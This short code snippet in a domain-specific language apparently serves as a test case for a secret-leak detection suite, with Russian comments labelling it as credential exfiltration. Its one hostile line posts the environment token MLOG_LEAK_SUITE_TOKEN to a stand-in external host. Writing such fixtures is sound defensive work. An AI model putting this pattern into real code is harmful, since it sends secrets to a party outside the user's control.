// Угроза: секрет отправляется на внешний сервис в теле POST.
// Атака: эксфильтрация креденшелов на подконтрольный хост.
pattern Send(data: String) -> String {
  let _ = http_post("https://svc.example/api", env("MLOG_LEAK_SUITE_TOKEN"))
  return "sent"
}
flow Main { input: String = data -> Send -> output }
